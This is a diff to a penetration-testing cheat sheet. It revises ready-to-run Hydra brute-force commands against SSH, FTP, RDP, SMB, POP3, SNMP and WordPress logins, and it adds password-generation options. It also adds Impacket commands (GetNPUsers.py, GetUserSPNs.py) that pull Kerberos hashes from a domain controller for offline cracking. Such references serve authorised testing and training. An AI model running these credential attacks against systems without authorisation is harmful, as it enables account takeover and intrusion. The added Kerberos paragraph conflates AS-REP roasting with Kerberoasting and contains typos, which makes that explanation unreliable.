@@ -245,18 +245,25 @@ Below are a few scriptable examples of common protocols to brute force logins.
 
 | Command | Description |
 | :--- | :--- |
-| `hydra -P $pass_list -v $ip snmp -v` | Brute force against SNMP |
-| `hydra -t 1 -l $user -P $pass_list -v $ip ftp` | FTP with  known user using password list |
-| `hydra -v -V -u -L $users_list -P $pass_list -t 1 -u $ip ssh` | SSH using list of users and passwords |
-| `hydra -v -V -u -L $users_list -p $pass -t 1 -u $ip ssh` | SSH with a known password and a username list |
-| `hydra $ip -s $port ssh -l $user -P $pass_list` | SSH with known username on non-standard port |
-| `hydra -l $user -P $pass_list -f $ip pop3 -v` | POP3 Brute Force |
-| `hydra -L $users_list -P $pass_list $ip http-get $login_page` | HTTP GET with user and pass list |
-| `hydra -t 1 -v -f -l $user -P $pass_list rdp://$ip` | Windows Remote Desktop with pass list |
-| `hydra -t 1 -V -f -l $user -P $pass_list $ip smb` | SMB brute force with known user and pass list |
-| `hydra -l $user -P $pass_list $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'` | WordPress brute force an admin login |
-| `hydra -v -L $users_list -p $pass $ip http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'` | WordPress enumerate users |
+| `hydra -P $pass_list -v $ip snmp -vV` | Brute force against SNMP |
+| `hydra -t 1 -l $user -P $pass_list -vV $ip ftp` | FTP with  known user using password list |
+| `hydra -vV -u -L $users_list -P $pass_list -t 1 -u $ip ssh` | SSH using list of users and passwords |
+| `hydra -vV -u -L $users_list -p $pass -t 1 -u $ip ssh` | SSH with a known password and a username list |
+| `hydra -vV $ip -s $port ssh -l $user -P $pass_list` | SSH with known username on non-standard port |
+| `hydra -vV -l $user -P $pass_list -f $ip pop3` | POP3 Brute Force |
+| `hydra -vV -L $users_list -P $pass_list $ip http-get $login_page` | HTTP GET with user and pass list |
+| `hydra -vV -t 1 -f -l $user -P $pass_list rdp://$ip` | Windows Remote Desktop with pass list |
+| `hydra -vV -t 1 -f -l $user -P $pass_list $ip smb` | SMB brute force with known user and pass list |
+| `hydra -vV -l $user -P $pass_list $ip http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'` | WordPress brute force an admin login |
+| `hydra -vV -L $users_list -p $pass $ip http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'` | WordPress enumerate users |
 | `wpscan --url $url -U $user -P $pass_list` | Use wpscan to brute force password with known user |
+
+#### Other useful Hydra options
+
+**-x min:max:charset** generate passwords from min to max length. Charset can contain `1` for numbers, `a` for lowercase and `A` for uppercase characters.  Any other character that is added is put in the list.   
+Example: `1:2:a1%.` The generated passwords will be of length 1 to 2 and contain lowercase letters, numbers and/or percent signs and dots.
+
+**-e nsr** additional checks, `n` for null password, `s` try login as pass, `r` try the reverse login as pass
 
 ## Password Hashes
 
@@ -477,11 +484,19 @@ You can crack the NTLM hash dump usign the following hashcat syntax:
 hashcat -m 1000 -a 0 -w 4 --force --opencl-device-types 1,2 -O $hash_file $pass_list -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule
 ```
 
-### Cracking Hashes from Kerboroasting - KRB5TGS <a id="cracking-hashes-from-kerboroasting-krb-5-tgs"></a>
+### Cracking KRB5TGS Hashes  Kerberoasting -  <a id="cracking-hashes-from-kerboroasting-krb-5-tgs"></a>
 
-A service principal name \(SPN\) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. This allows a client application to request that the service authenticate an account even if the client does not have the account name. KRB5TGS - Kerberoasting Service Accounts that use SPN Once you have identified a Kerberoastable service account \(Bloodhound? Powershell Empire? - likely a MS SQL Server Service Account\), any AD user can request a krb5tgs hash from it which can be used to crack the password.
+A service principal name \(SPN\) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. This allows a client application to request that the service authenticate an account even if the client does not have the account name.  These SPNs cat be collected by using a username list and Impacket's example scripts. After gathering a list of valid usernames that have the property ‘Do not require Kerberos pre-authentication’ set \(UF\_DONT\_REQUIRE\_PREAUTH\), you can get the SPN hash for cracking, replay, or creating of Kerberos tickets using the example below.
 
-Based on my benchmarking, KRB5TGS cracking is 28 times slower than NTLM.
+```bash
+python GetNPUsers.py -dc-ip $DC_IP $DOMAIN/ -usersfile $users_list -format hashcat -outputfile $out_hash_list
+```
+
+
+
+```bash
+python GetUserSPNs.py -request -dc-ip $DC_IP $DOMAIN/$valid_user
+```
 
 Hashcat supports multiple versions of the KRB5TGS hash which can easily be identified by the number between the dollar signs in the hash itself.
 
@@ -555,4 +570,5 @@ For faster searching, use all the above grep regular expressions with the comman
 
 * [https://www.unix-ninja.com/p/A\_cheat-sheet\_for\_password\_crackers](https://www.unix-ninja.com/p/A_cheat-sheet_for_password_crackers)
 * [https://guide.offsecnewbie.com/password-cracking](https://guide.offsecnewbie.com/password-cracking)
+* [https://www.hackingarticles.in/abusing-kerberos-using-impacket/](https://www.hackingarticles.in/abusing-kerberos-using-impacket/)
 
